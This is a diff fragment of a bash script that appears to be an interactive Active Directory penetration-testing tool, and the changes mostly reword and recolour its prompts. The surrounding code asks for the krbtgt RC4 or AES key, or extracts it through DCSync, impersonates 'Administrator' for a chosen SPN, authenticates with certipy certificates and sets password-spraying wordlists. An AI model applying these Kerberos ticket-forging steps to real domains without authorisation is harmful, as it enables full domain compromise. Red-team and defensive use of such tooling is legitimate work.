                     echo -e "${RED}Invalid username.${NC} Please specify another:"
                     read -rp ">> " tick_servuser </dev/tty
                 done
 
-                echo -e "Please specify '1' for NTLM and '2' for AES:"
-                read -rp ">> " ntlm_or_aes </dev/tty
-                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
-                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
-                    read -rp ">> " ntlm_or_aes </dev/tty
+                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+                read -rp ">> " rc4_or_aes </dev/tty
+                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                    read -rp ">> " rc4_or_aes </dev/tty
                 done
                 gethash_hash=""
-                echo -e "Please specify the NTLM or AES hash of the delegation account (press Enter to extract hash from NTDS (requires DCSync rights):"
+                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
                 read -rp ">> " gethash_hash </dev/tty
                 if [[ ${gethash_hash} == "" ]]; then
                     gethash_user=$tick_servuser
                     get_hash
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
                 fi
 
                 if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                     echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                 else
-                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-hashes :${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
+                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-hashes :${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
 
-                    echo -e "Please specify user name of user to impersonate (press Enter to choose default value 'Administrator'):"
+                    echo -e "${BLUE}[*] Please specify user name of user to impersonate (press Enter to choose default value 'Administrator'):"
                     read -rp ">> " tick_randuser_value </dev/tty
                     if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                    echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                     read -rp ">> " tick_spn_value </dev/tty
                     if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                     echo -e "${CYAN}[*] Requesting ticket for service $tick_spn_value...${NC}"
@@ -5215,14 +5256,14 @@ auth_menu() {
             echo -e "${RED}[-] Please verify the installation of certipy${NC}"
         else
             if [[ ${cert_bool} == false ]]; then
-                echo -e "Please specify location of certificate file:"
+                echo -e "${BLUE}[*] Please specify location of certificate file:"
                 read -rp ">> " pfxcert </dev/tty
                 while [ ! -s "${pfxcert}" ]; do
                     echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                     read -rp ">> " pfxcert </dev/tty
                 done
                 if [[ ${pfxpass} == "" ]]; then
-                    echo -e "Please specify password of certificate file (press Enter if no password):"
+                    echo -e "${BLUE}[*] Please specify password of certificate file (press Enter if no password):"
                     read -rp ">> " pfxpass </dev/tty
                 fi
             fi
@@ -5466,14 +5507,14 @@ config_menu() {
         ;;
 
     7)
-        echo -e "Please specify new users wordlist file:"
+        echo -e "${BLUE}[*] Please specify new users wordlist file:"
         read -rp ">> " user_wordlist </dev/tty
         echo -e "${GREEN}[+] Users wordlist file updated${NC}"
         config_menu
         ;;
 
     8)
-        echo -e "Please specify new passwords wordlist file:"
+        echo -e "${BLUE}[*] Please specify new passwords wordlist file:"
         read -rp ">> " pass_wordlist </dev/tty
         echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
         config_menu
